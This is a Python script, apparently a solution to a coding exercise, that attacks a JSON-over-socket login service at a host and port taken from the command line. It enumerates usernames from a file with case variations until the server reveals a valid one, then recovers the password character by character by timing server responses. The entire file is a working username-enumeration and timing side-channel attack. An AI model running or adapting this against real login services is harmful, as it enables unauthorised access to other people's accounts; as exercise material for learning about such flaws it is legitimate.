import itertools, string, socket, sys, json
from string import ascii_letters, digits
from datetime import datetime



def user_generator():
    with open('logins.txt', 'r') as file2:
        login = file2.readlines()
        login = (user.strip() for user in login)
    key2 = login

    for _ in range(1000):
        logins = list(dict.fromkeys((itertools.chain(map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in next(key2))))))))
        for users in logins:
            yield users


def json_join(login, password):

    jsondic = {'login': login, 'password': password}
    return json.dumps(jsondic)
logins = user_generator()
correct_login = None
correct_password = False
password = ''

with socket.socket() as client_socket:
    args = sys.argv
    hostname = args[1]
    port = int(args[2])
    address = (hostname, port)
    client_socket.connect(address)

    for user in logins:

        data = json_join(user, ' ')
        client_socket.send(data.encode())
        response_json = json.loads(client_socket.recv(1024).decode())

        if response_json['result'] == "Wrong password!":
            correct_login = user
            break

    while not correct_password:

        for item in ascii_letters + digits:

            test = password + item
            dic = json_join(correct_login, test)
            client_socket.send(dic.encode())
            start = datetime.now()
            response_json = json.loads(client_socket.recv(1024).decode())
            diff = datetime.now() - start
            difference = diff.total_seconds()

            if difference >= .1:
                password += item
            elif response_json['result'] ==  'Connection success!':
                correct_password = test
                break
            else:
                connect_password = test


print(json_join(correct_login,correct_password))